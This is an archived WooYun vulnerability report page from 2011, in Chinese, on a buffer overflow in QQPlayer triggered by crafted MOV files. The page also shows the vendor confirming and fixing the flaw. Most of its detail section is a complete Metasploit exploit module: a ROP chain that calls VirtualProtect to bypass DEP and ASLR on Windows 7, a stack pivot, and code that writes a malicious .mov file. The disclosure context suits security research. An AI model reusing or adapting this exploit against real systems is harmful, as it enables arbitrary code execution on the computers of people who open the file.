@@ -1,0 +1,288 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/hellok">hellok</a> 
+</li><li>提交时间：		2011-11-21 16:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-11-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-11-24：	细节向第三方安全合作伙伴开放<br/>
+									2011-12-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-12-11：	细节向普通白帽子公开<br/>
+									2011-12-31：	细节向实习白帽子公开<br/>
+									2011-12-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">qq播放器核心版本过低,在处理畸形MOV文件时,缓冲区溢出，可覆盖SEH任意代码执行<br />
+不愧为山寨之王<br />
+http://115.com/file/cl3naedv<br />
+http://115.com/file/aqu3qzmk<br />
+<br />
+<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code># Exploit Title: QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS<br />
+# Date: 2011,11,21<br />
+# Author: hellok<br />
+# Software Link: http://dl_dir.qq.com/invc/qqplayer/QQPlayer_Setup_32_845.exe<br />
+# Version: 32_845(lastest)<br />
+# Tested on: WIN7<br />
+require &#039;msf/core&#039;<br />
+class Metasploit3 &lt; Msf::Exploit::Remote<br />
+	include Msf::Exploit::FILEFORMAT<br />
+<br />
+	def initialize(info = {})<br />
+		super(update_info(info,<br />
+			&#039;Name&#039;           =&gt; &#039;QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS&#039;,<br />
+			&#039;Description&#039;    =&gt; %q{<br />
+					This module exploits a vulnerability in QQPLAYER Player 3.2.<br />
+				When opening a .mov file containing a specially crafted PnSize value, an attacker<br />
+				may be able to execute arbitrary code.<br />
+			},<br />
+			&#039;License&#039;        =&gt; MSF_LICENSE,<br />
+			&#039;Author&#039;         =&gt;<br />
+				[<br />
+					&#039;hellok&#039;,  #special thank corelanc0d3r for &#039;mona&#039;<br />
+				],<br />
+			&#039;References&#039;     =&gt;<br />
+				[<br />
+				],<br />
+			&#039;DefaultOptions&#039; =&gt;<br />
+				{<br />
+					&#039;EXITFUNC&#039; =&gt; &#039;process&#039;,<br />
+					&#039;DisablePayloadHandler&#039; =&gt; &#039;true&#039;,<br />
+				},<br />
+			&#039;Payload&#039;        =&gt;<br />
+				{<br />
+					&#039;Space&#039;          =&gt; 750,<br />
+					&#039;BadChars&#039;       =&gt; &quot;&quot;,  #Memcpy<br />
+					&#039;EncoderType&#039;    =&gt; Msf::Encoder::Type::AlphanumUpper,<br />
+					&#039;DisableNops&#039;    =&gt;  &#039;True&#039;,<br />
+					&#039;PrependEncoder&#039; =&gt; &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff&quot;,<br />
+					&#039;EncoderOptions&#039; =&gt;<br />
+						{<br />
+							&#039;BufferRegister&#039; =&gt; &#039;ECX&#039;,<br />
+						},<br />
+				},<br />
+			&#039;Platform&#039; =&gt; &#039;win&#039;,<br />
+			&#039;Targets&#039;        =&gt;<br />
+				[<br />
+					[ &#039;Windows 7&#039;, { &#039;Ret&#039; =&gt; 0x67664cde } ],<br />
+				],<br />
+			&#039;Privileged&#039;     =&gt; false,<br />
+			&#039;DisclosureDate&#039; =&gt; &#039;11 21 2011&#039;,<br />
+			&#039;DefaultTarget&#039;  =&gt; 0))<br />
+<br />
+		register_options(<br />
+			[<br />
+				OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,  &#039;msf.mov&#039; ]),<br />
+			], self.class)<br />
+	end<br />
+	def exploit<br />
+		# !mona rop<br />
+		rop_gadgets = <br />
+		[<br />
+			<br />
+			0x00418007,	# POP ECX # RETN (QQPlayer.exe)<br />
+			0x12345678,<br />
+			0x67664CE4,   <br />
+			0x01020304,<br />
+			0x10203040,<br />
+			0x22331122,<br />
+			0x23456789,<br />
+			<br />
+			0x00418007,	# POP ECX # RETN (QQPlayer.exe)<br />
+			0x00a9c18c,	# &lt;- *&amp;VirtualProtect() <br />
+			0x0054f100,	# MOV EAX,DWORD PTR DS:[ECX] # RETN (QQPlayer.exe)<br />
+			#0x008e750c, LEA ESI,EAX # RETN (QQPlayer.exe)<br />
+			0x008cf099,	# XCHG EAX,ESI # RETN<br />
+			<br />
+			0x6497aaad,	# POP EBP # RETN (avformat-52.dll)<br />
+			0x100272bf,	# ptr to &#039;call esp&#039; (from i18nu.dll)<br />
+			0x005fc00b,	# POP EBX # RETN (QQPlayer.exe)<br />
+			0x00000331,	# &lt;- change size to mark as executable if needed (-&gt; ebx)<br />
+			0x00418007,	# POP ECX # RETN (QQPlayer.exe)<br />
+			0x63d18000,	# RW pointer (lpOldProtect) (-&gt; ecx)<br />
+			0x63d05001,	# POP EDI # RETN (avutil-49.dll)<br />
+			0x63d05002,	# ROP NOP (-&gt; edi)<br />
+			0x008bf00b,	# POP EDX # RETN (QQPlayer.exe)<br />
+			0x00000040,	# newProtect (0x40) (-&gt; edx)<br />
+			0x00468800,	# POP EAX # RETN (QQPlayer.exe)<br />
+			0x90909090,	# NOPS (-&gt; eax)<br />
+			0x008bad5c,	# PUSHAD # RETN (QQPlayer.exe)<br />
+		# rop chain generated by mona.py<br />
+		# note : this chain may not work out of the box<br />
+		# you may have to change order or fix some gadgets,<br />
+		# but it should give you a head start<br />
+		].pack(&quot;V*&quot;)<br />
+<br />
+		stackpivot = [target.ret].pack(&#039;L&#039;)<br />
+<br />
+		buffer =rand_text_alpha_upper(90)#2<br />
+		buffer &lt;&lt; rop_gadgets<br />
+		buffer &lt;&lt; payload.encoded<br />
+<br />
+		junk = rand_text_alpha_upper(2306 - buffer.length)<br />
+<br />
+		buffer &lt;&lt; junk<br />
+		buffer &lt;&lt; stackpivot<br />
+		buffer &lt;&lt; rand_text_alpha_upper(3000)#3000<br />
+<br />
+		path = File.join( Msf::Config.install_root, &quot;data&quot;, &quot;exploits&quot;, &quot;CVE-2011-0257.mov&quot; )<br />
+		fd = File.open(path, &quot;rb&quot; )<br />
+		sploit = fd.read(fd.stat.size)<br />
+		fd.close<br />
+<br />
+		sploit &lt;&lt; buffer<br />
+<br />
+		file_create(sploit)<br />
+	end<br />
+end</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">无 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/hellok" title="hellok">hellok</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03368" title="QQPLAYER PICT PnSize Buffer Overflow WIN7 DEP_ASLR BYPASS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2011-11-21 18:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢你的报告，我们正在跟进。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2011-11-22：跟进中</p>
+												<p class="detail">2011-11-24：已修复</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3368";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
